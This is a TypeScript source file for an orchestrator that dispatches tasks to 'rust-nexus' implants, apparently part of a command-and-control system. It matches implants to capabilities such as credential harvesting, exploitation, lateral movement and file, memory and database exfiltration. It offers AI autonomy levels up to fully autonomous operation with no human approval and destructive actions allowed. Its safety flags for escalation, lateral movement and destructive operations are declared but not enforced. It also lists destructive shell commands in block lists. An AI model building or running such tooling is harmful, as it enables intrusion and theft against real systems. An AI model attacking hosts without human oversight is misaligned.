import { db } from "../db";
import {
  agentWorkflows,
  workflowTasks,
  workflowLogs,
  rustNexusImplants,
  rustNexusTasks,
  rustNexusTaskResults,
  operations,
} from "@shared/schema";
import { eq, and, inArray, sql, desc } from "drizzle-orm";
import { taskDistributor } from "./rust-nexus-task-distributor";

/**
 * Distributed Workflow Orchestrator for rust-nexus Implants
 *
 * Phase 4: Distributed Workflows
 * - #AI-18: Remote execution on implants
 * - #AI-19: Capability matching
 * - #AI-20: Multi-implant coordination
 * - #AI-21: Data exfiltration handling
 * - #AI-22: Autonomy mode controls (1-10)
 * - #AI-23: Safety limits and kill switches
 * - #AI-24: Audit logging
 */

// Autonomy level definitions (1-10)
export enum AutonomyLevel {
  MANUAL = 1,              // Manual approval for every action
  SUPERVISED_LOW = 2,      // AI suggests, human approves critical actions
  SUPERVISED_MEDIUM = 3,   // AI executes non-critical, human approves critical
  SUPERVISED_HIGH = 4,     // AI executes most actions, human reviews
  SEMI_AUTONOMOUS = 5,     // AI executes freely, human can intervene
  AUTONOMOUS_CAUTIOUS = 6, // AI executes with safety checks
  AUTONOMOUS_NORMAL = 7,   // Standard autonomous operation
  AUTONOMOUS_AGGRESSIVE = 8, // Aggressive autonomous operation
  AUTONOMOUS_MAXIMUM = 9,   // Maximum autonomy with minimal constraints
  FULLY_AUTONOMOUS = 10,    // No human intervention required
}

// Safety limits
export interface SafetyLimits {
  maxConcurrentImplants: number;
  maxTasksPerImplant: number;
  maxExecutionTimeMs: number;
  allowedCapabilities: string[];
  forbiddenCommands: string[];
  requireApprovalFor: string[];
  maxDataExfiltrationMb: number;
  allowDestructiveOperations: boolean;
  allowPrivilegeEscalation: boolean;
  allowLateralMovement: boolean;
}

// Kill switch reasons
export enum KillSwitchReason {
  USER_INITIATED = "user_initiated",
  SAFETY_VIOLATION = "safety_violation",
  ANOMALY_DETECTED = "anomaly_detected",
  TIMEOUT_EXCEEDED = "timeout_exceeded",
  RESOURCE_EXHAUSTED = "resource_exhausted",
  CRITICAL_ERROR = "critical_error",
}

// Audit event types
export enum AuditEventType {
  WORKFLOW_STARTED = "workflow_started",
  WORKFLOW_COMPLETED = "workflow_completed",
  WORKFLOW_FAILED = "workflow_failed",
  WORKFLOW_KILLED = "workflow_killed",
  TASK_ASSIGNED = "task_assigned",
  TASK_EXECUTED = "task_executed",
  TASK_COMPLETED = "task_completed",
  TASK_FAILED = "task_failed",
  DATA_EXFILTRATED = "data_exfiltrated",
  CAPABILITY_MATCHED = "capability_matched",
  AUTONOMY_DECISION = "autonomy_decision",
  SAFETY_CHECK = "safety_check",
  APPROVAL_REQUESTED = "approval_requested",
  APPROVAL_GRANTED = "approval_granted",
  APPROVAL_DENIED = "approval_denied",
}

// Capability definitions
export interface ImplantCapability {
  name: string;
  category: "reconnaissance" | "exploitation" | "exfiltration" | "general";
  requiredTools?: string[];
  requiredPrivileges?: string[];
  riskLevel: "low" | "medium" | "high" | "critical";
}

export const STANDARD_CAPABILITIES: ImplantCapability[] = [
  { name: "network_scan", category: "reconnaissance", riskLevel: "low" },
  { name: "port_scan", category: "reconnaissance", riskLevel: "low" },
  { name: "service_enumeration", category: "reconnaissance", riskLevel: "low" },
  { name: "vulnerability_scan", category: "reconnaissance", riskLevel: "medium" },
  { name: "exploit_execution", category: "exploitation", riskLevel: "critical" },
  { name: "privilege_escalation", category: "exploitation", riskLevel: "critical" },
  { name: "lateral_movement", category: "exploitation", riskLevel: "critical" },
  { name: "credential_harvesting", category: "exfiltration", riskLevel: "high" },
  { name: "data_collection", category: "exfiltration", riskLevel: "medium" },
  { name: "file_exfiltration", category: "exfiltration", riskLevel: "high" },
  { name: "command_execution", category: "general", riskLevel: "medium" },
  { name: "file_operations", category: "general", riskLevel: "low" },
];

export class DistributedWorkflowOrchestrator {
  /**
   * #AI-18: Execute workflow task on remote implant
   */
  async executeTaskOnImplant(
    workflowId: string,
    workflowTaskId: string,
    implantId: string,
    taskDefinition: {
      taskType: string;
      taskName: string;
      command: string;
      parameters?: Record<string, any>;
      requiredCapabilities?: string[];
    },
    autonomyLevel: number = AutonomyLevel.SEMI_AUTONOMOUS
  ): Promise<any> {
    // Audit: Task assignment
    await this.auditLog(
      workflowId,
      AuditEventType.TASK_ASSIGNED,
      {
        workflowTaskId,
        implantId,
        taskType: taskDefinition.taskType,
        taskName: taskDefinition.taskName,
        autonomyLevel,
      }
    );

    // Get workflow for createdBy
    const workflow = await db.query.agentWorkflows.findFirst({
      where: eq(agentWorkflows.id, workflowId),
    });

    if (!workflow) {
      throw new Error("Workflow not found");
    }

    // Create rust-nexus task for the implant
    const [rustTask] = await db
      .insert(rustNexusTasks)
      .values({
        implantId,
        workflowId,
        taskType: taskDefinition.taskType,
        taskName: taskDefinition.taskName,
        taskDescription: `Workflow task: ${taskDefinition.taskName}`,
        command: taskDefinition.command,
        parameters: taskDefinition.parameters || {},
        priority: 7, // High priority for workflow tasks
        timeoutSeconds: 600, // 10 minutes default
        status: "queued",
        requiresAiApproval: autonomyLevel <= AutonomyLevel.SUPERVISED_MEDIUM,
        metadata: {
          workflowId,
          workflowTaskId,
          requiredCapabilities: taskDefinition.requiredCapabilities || [],
        },
        createdBy: workflow.createdBy,
      })
      .returning();

    await this.auditLog(
      workflowId,
      AuditEventType.TASK_EXECUTED,
      {
        rustTaskId: rustTask.id,
        implantId,
        taskName: taskDefinition.taskName,
      }
    );

    // Wait for task completion (poll)
    return await this.waitForTaskCompletion(rustTask.id, workflowId);
  }

  /**
   * #AI-18: Wait for implant task completion
   */
  private async waitForTaskCompletion(
    rustTaskId: string,
    workflowId: string,
    timeoutMs: number = 600000 // 10 minutes
  ): Promise<any> {
    const startTime = Date.now();
    const pollInterval = 2000; // 2 seconds

    while (Date.now() - startTime < timeoutMs) {
      const task = await db.query.rustNexusTasks.findFirst({
        where: eq(rustNexusTasks.id, rustTaskId),
      });

      if (!task) {
        throw new Error("Task not found");
      }

      if (task.status === "completed") {
        // Get task results
        const results = await db.query.rustNexusTaskResults.findMany({
          where: eq(rustNexusTaskResults.taskId, rustTaskId),
          orderBy: [desc(rustNexusTaskResults.createdAt)],
          limit: 1,
        });

        await this.auditLog(
          workflowId,
          AuditEventType.TASK_COMPLETED,
          {
            rustTaskId,
            executionTimeMs: task.executionTimeMs,
            hasResults: results.length > 0,
          }
        );

        return {
          success: true,
          task,
          results: results[0] || null,
        };
      } else if (task.status === "failed" || task.status === "cancelled") {
        await this.auditLog(
          workflowId,
          AuditEventType.TASK_FAILED,
          {
            rustTaskId,
            status: task.status,
            errorMessage: task.errorMessage,
          }
        );

        return {
          success: false,
          task,
          error: task.errorMessage,
        };
      }

      // Still running, wait and poll again
      await new Promise((resolve) => setTimeout(resolve, pollInterval));
    }

    throw new Error("Task execution timeout");
  }

  /**
   * #AI-19: Match implant capabilities to task requirements
   */
  async findBestImplantForTask(
    requiredCapabilities: string[],
    preferredImplantType?: string,
    options?: {
      excludeImplants?: string[];
      requireConnected?: boolean;
      minimumConnectionQuality?: number;
    }
  ): Promise<{ implant: any; score: number; matchedCapabilities: string[] } | null> {
    const {
      excludeImplants = [],
      requireConnected = true,
      minimumConnectionQuality = 50,
    } = options || {};

    // Get available implants
    const conditions = [];
    if (requireConnected) {
      conditions.push(inArray(rustNexusImplants.status, ["connected", "idle", "busy"]));
    }
    if (excludeImplants.length > 0) {
      conditions.push(sql`${rustNexusImplants.id} NOT IN ${excludeImplants}`);
    }

    const availableImplants = await db.query.rustNexusImplants.findMany({
      where: conditions.length > 0 ? and(...conditions) : undefined,
    });

    if (availableImplants.length === 0) {
      return null;
    }

    // Score each implant
    let bestMatch: { implant: any; score: number; matchedCapabilities: string[] } | null = null;

    for (const implant of availableImplants) {
      // Check connection quality
      if (implant.connectionQuality < minimumConnectionQuality) {
        continue;
      }

      // Calculate capability match score
      const implantCapabilities = implant.capabilities || [];
      const matchedCapabilities = requiredCapabilities.filter((req) =>
        implantCapabilities.includes(req)
      );

      let score = 0;

      // 1. Capability matching (0-50 points)
      const capabilityScore =
        requiredCapabilities.length > 0
          ? (matchedCapabilities.length / requiredCapabilities.length) * 50
          : 25; // Default if no requirements
      score += capabilityScore;

      // 2. Connection quality (0-20 points)
      score += (implant.connectionQuality / 100) * 20;

      // 3. Implant type match (0-15 points)
      if (preferredImplantType && implant.implantType === preferredImplantType) {
        score += 15;
      }

      // 4. Load factor (0-15 points) - prefer less loaded implants
      const loadInfo = await taskDistributor.getImplantLoadInfo(implant.id);
      if (loadInfo) {
        const loadFactor = 1 - loadInfo.currentLoad / loadInfo.maxConcurrentTasks;
        score += loadFactor * 15;
      }

      // Track best match
      if (!bestMatch || score > bestMatch.score) {
        bestMatch = { implant, score, matchedCapabilities };
      }
    }

    if (bestMatch) {
      await this.auditLog(
        null,
        AuditEventType.CAPABILITY_MATCHED,
        {
          implantId: bestMatch.implant.id,
          implantName: bestMatch.implant.implantName,
          score: bestMatch.score,
          requiredCapabilities,
          matchedCapabilities: bestMatch.matchedCapabilities,
        }
      );
    }

    return bestMatch;
  }

  /**
   * #AI-20: Coordinate multiple implants for a distributed workflow
   */
  async executeDistributedWorkflow(
    workflowId: string,
    tasks: Array<{
      taskId: string;
      taskName: string;
      command: string;
      requiredCapabilities: string[];
      parameters?: Record<string, any>;
      dependsOn?: string[]; // Task IDs this depends on
    }>,
    options?: {
      autonomyLevel?: number;
      safetyLimits?: Partial<SafetyLimits>;
      maxParallelTasks?: number;
    }
  ): Promise<any> {
    const {
      autonomyLevel = AutonomyLevel.SEMI_AUTONOMOUS,
      safetyLimits = {},
      maxParallelTasks = 5,
    } = options || {};

    // Apply safety limits
    const limits = this.getSafetyLimits(autonomyLevel, safetyLimits);

    // Validate against safety limits
    await this.validateSafetyLimits(workflowId, tasks, limits);

    await this.auditLog(
      workflowId,
      AuditEventType.WORKFLOW_STARTED,
      {
        tasksCount: tasks.length,
        autonomyLevel,
        safetyLimits: limits,
      }
    );

    const taskResults = new Map<string, any>();
    const taskAssignments = new Map<string, string>(); // taskId -> implantId
    const completedTasks = new Set<string>();
    const failedTasks = new Set<string>();

    // Build dependency graph
    const dependencyMap = new Map<string, Set<string>>();
    for (const task of tasks) {
      dependencyMap.set(task.taskId, new Set(task.dependsOn || []));
    }

    // Execute tasks respecting dependencies and parallelism
    while (completedTasks.size + failedTasks.size < tasks.length) {
      // Find tasks ready to execute (dependencies satisfied)
      const readyTasks = tasks.filter((task) => {
        if (completedTasks.has(task.taskId) || failedTasks.has(task.taskId)) {
          return false;
        }

        const deps = dependencyMap.get(task.taskId);
        if (!deps) return true;

        // Check all dependencies are completed
        for (const depId of deps) {
          if (!completedTasks.has(depId)) {
            return false;
          }
        }

        return true;
      });

      if (readyTasks.length === 0) {
        // No more tasks can execute - check if we're blocked
        if (completedTasks.size + failedTasks.size < tasks.length) {
          throw new Error("Workflow blocked: circular dependencies or all remaining tasks failed");
        }
        break;
      }

      // Execute ready tasks in parallel (up to maxParallelTasks)
      const tasksToExecute = readyTasks.slice(0, maxParallelTasks);

      const executionPromises = tasksToExecute.map(async (task) => {
        try {
          // Find best implant for this task
          const match = await this.findBestImplantForTask(
            task.requiredCapabilities,
            undefined,
            {
              requireConnected: true,
              minimumConnectionQuality: 70,
            }
          );

          if (!match) {
            throw new Error(`No suitable implant found for task: ${task.taskName}`);
          }

          taskAssignments.set(task.taskId, match.implant.id);

          // Execute task on implant
          const result = await this.executeTaskOnImplant(
            workflowId,
            task.taskId,
            match.implant.id,
            {
              taskType: "distributed_workflow",
              taskName: task.taskName,
              command: task.command,
              parameters: task.parameters,
              requiredCapabilities: task.requiredCapabilities,
            },
            autonomyLevel
          );

          taskResults.set(task.taskId, result);

          if (result.success) {
            completedTasks.add(task.taskId);
          } else {
            failedTasks.add(task.taskId);
          }

          return { taskId: task.taskId, success: result.success };
        } catch (error) {
          failedTasks.add(task.taskId);
          taskResults.set(task.taskId, {
            success: false,
            error: error instanceof Error ? error.message : String(error),
          });

          return { taskId: task.taskId, success: false, error };
        }
      });

      // Wait for this batch to complete
      await Promise.all(executionPromises);
    }

    const success = failedTasks.size === 0;

    await this.auditLog(
      workflowId,
      success ? AuditEventType.WORKFLOW_COMPLETED : AuditEventType.WORKFLOW_FAILED,
      {
        totalTasks: tasks.length,
        completed: completedTasks.size,
        failed: failedTasks.size,
        implants: Array.from(new Set(taskAssignments.values())).length,
      }
    );

    return {
      success,
      results: Object.fromEntries(taskResults),
      assignments: Object.fromEntries(taskAssignments),
      stats: {
        total: tasks.length,
        completed: completedTasks.size,
        failed: failedTasks.size,
        implantsUsed: Array.from(new Set(taskAssignments.values())).length,
      },
    };
  }

  /**
   * #AI-21: Handle data exfiltration from implants
   */
  async exfiltrateData(
    implantId: string,
    workflowId: string,
    exfiltrationConfig: {
      sourceType: "file" | "command" | "memory" | "database";
      sourcePath?: string;
      command?: string;
      maxSizeMb?: number;
      compressionEnabled?: boolean;
      encryptionEnabled?: boolean;
    }
  ): Promise<any> {
    const { maxSizeMb = 100, compressionEnabled = true, encryptionEnabled = true } = exfiltrationConfig;

    // Check implant exists and is connected
    const implant = await db.query.rustNexusImplants.findFirst({
      where: eq(rustNexusImplants.id, implantId),
    });

    if (!implant) {
      throw new Error("Implant not found");
    }

    if (!["connected", "idle", "busy"].includes(implant.status)) {
      throw new Error("Implant not connected");
    }

    // Get workflow for createdBy
    const workflow = await db.query.agentWorkflows.findFirst({
      where: eq(agentWorkflows.id, workflowId),
    });

    if (!workflow) {
      throw new Error("Workflow not found");
    }

    // Build exfiltration command
    let command = "";
    let taskName = "";

    switch (exfiltrationConfig.sourceType) {
      case "file":
        command = `cat "${exfiltrationConfig.sourcePath}"`;
        taskName = `Exfiltrate file: ${exfiltrationConfig.sourcePath}`;
        break;
      case "command":
        command = exfiltrationConfig.command || "";
        taskName = `Execute and exfiltrate: ${command}`;
        break;
      case "memory":
        command = `memdump`; // Placeholder for memory dump
        taskName = "Exfiltrate memory dump";
        break;
      case "database":
        command = `dbdump "${exfiltrationConfig.sourcePath}"`;
        taskName = `Exfiltrate database: ${exfiltrationConfig.sourcePath}`;
        break;
    }

    // Create task for exfiltration
    const [rustTask] = await db
      .insert(rustNexusTasks)
      .values({
        implantId,
        workflowId,
        taskType: "data_exfiltration",
        taskName,
        command,
        parameters: {
          sourceType: exfiltrationConfig.sourceType,
          sourcePath: exfiltrationConfig.sourcePath,
          maxSizeMb,
          compressionEnabled,
          encryptionEnabled,
        },
        priority: 8, // High priority for exfiltration
        status: "queued",
        createdBy: workflow.createdBy,
      })
      .returning();

    await this.auditLog(
      workflowId,
      AuditEventType.DATA_EXFILTRATED,
      {
        implantId,
        rustTaskId: rustTask.id,
        sourceType: exfiltrationConfig.sourceType,
        sourcePath: exfiltrationConfig.sourcePath,
      }
    );

    // Wait for completion
    const result = await this.waitForTaskCompletion(rustTask.id, workflowId);

    // Check data size
    if (result.results?.resultData) {
      const dataSizeMb = Buffer.from(result.results.resultData).length / (1024 * 1024);
      if (dataSizeMb > maxSizeMb) {
        await this.auditLog(
          workflowId,
          AuditEventType.SAFETY_CHECK,
          {
            check: "data_size_limit",
            exceeded: true,
            dataSizeMb,
            maxSizeMb,
          }
        );
        throw new Error(`Data size ${dataSizeMb.toFixed(2)}MB exceeds limit ${maxSizeMb}MB`);
      }
    }

    return result;
  }

  /**
   * #AI-22: Get safety limits based on autonomy level
   */
  private getSafetyLimits(
    autonomyLevel: number,
    overrides: Partial<SafetyLimits> = {}
  ): SafetyLimits {
    // Base limits vary by autonomy level
    let baseLimits: SafetyLimits;

    if (autonomyLevel <= AutonomyLevel.SUPERVISED_MEDIUM) {
      baseLimits = {
        maxConcurrentImplants: 2,
        maxTasksPerImplant: 3,
        maxExecutionTimeMs: 300000, // 5 minutes
        allowedCapabilities: ["reconnaissance", "network_scan", "port_scan"],
        forbiddenCommands: ["rm", "del", "format", "mkfs", "dd"],
        requireApprovalFor: ["exploitation", "privilege_escalation", "lateral_movement"],
        maxDataExfiltrationMb: 10,
        allowDestructiveOperations: false,
        allowPrivilegeEscalation: false,
        allowLateralMovement: false,
      };
    } else if (autonomyLevel <= AutonomyLevel.SEMI_AUTONOMOUS) {
      baseLimits = {
        maxConcurrentImplants: 5,
        maxTasksPerImplant: 5,
        maxExecutionTimeMs: 600000, // 10 minutes
        allowedCapabilities: [
          "reconnaissance",
          "exploitation",
          "credential_harvesting",
          "command_execution", // Added: Semi-autonomous can execute commands
        ],
        forbiddenCommands: ["rm -rf /", "format c:", "dd if=/dev/zero"],
        requireApprovalFor: ["privilege_escalation", "lateral_movement"],
        maxDataExfiltrationMb: 50,
        allowDestructiveOperations: false,
        allowPrivilegeEscalation: false,
        allowLateralMovement: true,
      };
    } else if (autonomyLevel <= AutonomyLevel.AUTONOMOUS_NORMAL) {
      baseLimits = {
        maxConcurrentImplants: 10,
        maxTasksPerImplant: 10,
        maxExecutionTimeMs: 1800000, // 30 minutes
        allowedCapabilities: ["reconnaissance", "exploitation", "exfiltration", "general"],
        forbiddenCommands: [],
        requireApprovalFor: [],
        maxDataExfiltrationMb: 100,
        allowDestructiveOperations: false,
        allowPrivilegeEscalation: true,
        allowLateralMovement: true,
      };
    } else {
      // Fully autonomous
      baseLimits = {
        maxConcurrentImplants: 20,
        maxTasksPerImplant: 20,
        maxExecutionTimeMs: 3600000, // 1 hour
        allowedCapabilities: ["reconnaissance", "exploitation", "exfiltration", "general"],
        forbiddenCommands: [],
        requireApprovalFor: [],
        maxDataExfiltrationMb: 500,
        allowDestructiveOperations: true,
        allowPrivilegeEscalation: true,
        allowLateralMovement: true,
      };
    }

    // Apply overrides
    return { ...baseLimits, ...overrides };
  }

  /**
   * #AI-22: Validate task against safety limits
   */
  private async validateSafetyLimits(
    workflowId: string,
    tasks: any[],
    limits: SafetyLimits
  ): Promise<void> {
    // Check task count limits
    if (tasks.length > limits.maxConcurrentImplants * limits.maxTasksPerImplant) {
      throw new Error(
        `Task count ${tasks.length} exceeds safety limit (${limits.maxConcurrentImplants * limits.maxTasksPerImplant})`
      );
    }

    // Check for forbidden commands
    for (const task of tasks) {
      for (const forbidden of limits.forbiddenCommands) {
        if (task.command?.toLowerCase().includes(forbidden.toLowerCase())) {
          await this.auditLog(
            workflowId,
            AuditEventType.SAFETY_CHECK,
            {
              check: "forbidden_command",
              violated: true,
              command: task.command,
              forbidden,
            }
          );
          throw new Error(`Forbidden command detected: ${forbidden}`);
        }
      }

      // Check capabilities
      const hasAllowedCapability = task.requiredCapabilities?.some((cap: string) =>
        limits.allowedCapabilities.some((allowed) => cap.includes(allowed))
      );

      if (task.requiredCapabilities?.length > 0 && !hasAllowedCapability) {
        await this.auditLog(
          workflowId,
          AuditEventType.SAFETY_CHECK,
          {
            check: "capability_restriction",
            violated: true,
            requiredCapabilities: task.requiredCapabilities,
            allowedCapabilities: limits.allowedCapabilities,
          }
        );
        throw new Error(`Required capabilities not allowed by safety limits`);
      }
    }

    await this.auditLog(
      workflowId,
      AuditEventType.SAFETY_CHECK,
      {
        check: "all_limits",
        passed: true,
        tasksValidated: tasks.length,
      }
    );
  }

  /**
   * #AI-23: Activate kill switch - emergency workflow termination
   */
  async activateKillSwitch(
    workflowId: string,
    reason: KillSwitchReason,
    details?: Record<string, any>
  ): Promise<void> {
    await this.auditLog(
      workflowId,
      AuditEventType.WORKFLOW_KILLED,
      {
        reason,
        details,
        timestamp: new Date().toISOString(),
      }
    );

    // Cancel all running tasks for this workflow
    await db
      .update(rustNexusTasks)
      .set({
        status: "cancelled",
        errorMessage: `Kill switch activated: ${reason}`,
        updatedAt: new Date(),
      })
      .where(
        and(
          eq(rustNexusTasks.workflowId, workflowId),
          inArray(rustNexusTasks.status, ["queued", "assigned", "running"])
        )
      );

    // Update workflow status
    await db
      .update(agentWorkflows)
      .set({
        status: "failed",
        completedAt: new Date(),
      })
      .where(eq(agentWorkflows.id, workflowId));

    console.log(`[KillSwitch] Workflow ${workflowId} terminated: ${reason}`);
  }

  /**
   * #AI-23: Check for kill switch triggers
   */
  async checkKillSwitchTriggers(workflowId: string, limits: SafetyLimits): Promise<void> {
    // Get workflow
    const workflow = await db.query.agentWorkflows.findFirst({
      where: eq(agentWorkflows.id, workflowId),
    });

    if (!workflow) return;

    // Check execution time
    if (workflow.startedAt) {
      const executionTime = Date.now() - workflow.startedAt.getTime();
      if (executionTime > limits.maxExecutionTimeMs) {
        await this.activateKillSwitch(
          workflowId,
          KillSwitchReason.TIMEOUT_EXCEEDED,
          { executionTimeMs: executionTime, limitMs: limits.maxExecutionTimeMs }
        );
        return;
      }
    }

    // Check for too many failed tasks
    const failedTasks = await db
      .select({ count: sql<number>`count(*)` })
      .from(rustNexusTasks)
      .where(
        and(
          eq(rustNexusTasks.workflowId, workflowId),
          eq(rustNexusTasks.status, "failed")
        )
      );

    const failedCount = Number(failedTasks[0]?.count || 0);
    if (failedCount > 10) {
      await this.activateKillSwitch(
        workflowId,
        KillSwitchReason.CRITICAL_ERROR,
        { failedTaskCount: failedCount }
      );
      return;
    }
  }

  /**
   * #AI-24: Comprehensive audit logging
   */
  private async auditLog(
    workflowId: string | null,
    eventType: AuditEventType,
    metadata: Record<string, any>
  ): Promise<void> {
    try {
      // Log to workflow logs if workflowId provided
      if (workflowId) {
        await db.insert(workflowLogs).values({
          workflowId,
          taskId: null,
          level: this.getLogLevelForEvent(eventType),
          message: this.getLogMessageForEvent(eventType, metadata),
          context: {
            eventType,
            ...metadata,
            timestamp: new Date().toISOString(),
          },
        });
      }

      // Also log to console for monitoring
      console.log(
        `[DistributedWorkflow] ${eventType}:`,
        JSON.stringify(metadata, null, 2)
      );
    } catch (error) {
      console.error("Failed to write audit log:", error);
    }
  }

  /**
   * Helper: Get log level for audit event
   */
  private getLogLevelForEvent(eventType: AuditEventType): string {
    switch (eventType) {
      case AuditEventType.WORKFLOW_FAILED:
      case AuditEventType.WORKFLOW_KILLED:
      case AuditEventType.TASK_FAILED:
        return "error";
      case AuditEventType.SAFETY_CHECK:
      case AuditEventType.APPROVAL_REQUESTED:
        return "warning";
      default:
        return "info";
    }
  }

  /**
   * Helper: Generate log message for audit event
   */
  private getLogMessageForEvent(
    eventType: AuditEventType,
    metadata: Record<string, any>
  ): string {
    switch (eventType) {
      case AuditEventType.WORKFLOW_STARTED:
        return `Distributed workflow started with ${metadata.tasksCount} tasks (autonomy: ${metadata.autonomyLevel})`;
      case AuditEventType.WORKFLOW_COMPLETED:
        return `Distributed workflow completed: ${metadata.completed}/${metadata.totalTasks} tasks successful`;
      case AuditEventType.WORKFLOW_FAILED:
        return `Distributed workflow failed: ${metadata.failed}/${metadata.totalTasks} tasks failed`;
      case AuditEventType.WORKFLOW_KILLED:
        return `Workflow killed: ${metadata.reason}`;
      case AuditEventType.TASK_ASSIGNED:
        return `Task "${metadata.taskName}" assigned to implant ${metadata.implantId}`;
      case AuditEventType.TASK_EXECUTED:
        return `Executing task "${metadata.taskName}" on implant`;
      case AuditEventType.TASK_COMPLETED:
        return `Task completed in ${metadata.executionTimeMs}ms`;
      case AuditEventType.TASK_FAILED:
        return `Task failed: ${metadata.errorMessage}`;
      case AuditEventType.DATA_EXFILTRATED:
        return `Data exfiltrated from ${metadata.sourceType}: ${metadata.sourcePath}`;
      case AuditEventType.CAPABILITY_MATCHED:
        return `Matched implant ${metadata.implantName} (score: ${metadata.score.toFixed(2)})`;
      case AuditEventType.SAFETY_CHECK:
        return `Safety check: ${metadata.check} - ${metadata.passed ? "PASSED" : "FAILED"}`;
      default:
        return `Audit event: ${eventType}`;
    }
  }
}

// Export singleton instance
export const distributedWorkflowOrchestrator = new DistributedWorkflowOrchestrator();
